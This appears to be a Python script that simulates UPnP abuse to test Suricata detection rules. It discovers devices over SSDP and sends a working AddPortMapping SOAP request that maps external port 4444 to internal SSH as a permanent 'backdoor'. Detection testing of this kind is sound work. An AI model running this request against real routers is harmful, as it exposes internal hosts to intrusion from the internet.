#!/usr/bin/env python3
"""
Simulates UPnP abuse — discovers IoT devices via SSDP and sends
malicious port mapping requests. This is how attackers expose
internal devices to the internet.
Detection: Suricata SSDP rules + NPU abnormal port pattern.
"""
from scapy.all import *
import socket
import sys

def ssdp_discover(timeout=5):
    print("[UPnP Abuse] Phase 1: SSDP Discovery")
    msg = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n\r\n"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    sock.sendto(msg.encode(), ("239.255.255.250", 1900))
    print(f"  Sent M-SEARCH to 239.255.255.250:1900")

    devices = []
    try:
        while True:
            data, addr = sock.recvfrom(4096)
            resp = data.decode(errors='ignore')
            location = ""
            for line in resp.split("\r\n"):
                if line.upper().startswith("LOCATION:"):
                    location = line.split(":", 1)[1].strip()
            print(f"  Device: {addr[0]}:{addr[1]} -> {location[:80]}")
            devices.append((addr, location))
    except socket.timeout:
        pass

    print(f"  Total UPnP devices found: {len(devices)}")
    sock.close()
    return devices

def fake_port_mapping(target="127.0.0.1", port=8080):
    print(f"\n[UPnP Abuse] Phase 2: Fake AddPortMapping -> {target}")
    soap_body = """<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
      <NewRemoteHost></NewRemoteHost>
      <NewExternalPort>4444</NewExternalPort>
      <NewProtocol>TCP</NewProtocol>
      <NewInternalPort>22</NewInternalPort>
      <NewInternalClient>{target}</NewInternalClient>
      <NewEnabled>1</NewEnabled>
      <NewPortMappingDescription>backdoor</NewPortMappingDescription>
      <NewLeaseDuration>0</NewLeaseDuration>
    </u:AddPortMapping>
  </s:Body>
</s:Envelope>""".format(target=target)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target, port))
        request = (
            f"POST /ctl/IPConn HTTP/1.1\r\n"
            f"Host: {target}:{port}\r\n"
            f"Content-Type: text/xml\r\n"
            f"SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\"\r\n"
            f"Content-Length: {len(soap_body)}\r\n\r\n"
            f"{soap_body}"
        )
        s.send(request.encode())
        resp = s.recv(1024)
        print(f"  Response: {resp.decode(errors='ignore')[:100]}")
        s.close()
    except Exception as e:
        print(f"  Expected error (no real UPnP): {e}")
    print("  (In real attack, this would expose internal SSH to the internet)")

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    print("=== UPnP Abuse Simulation ===\n")
    devices = ssdp_discover()
    fake_port_mapping(target)
    print("\n=== UPnP abuse test complete ===")
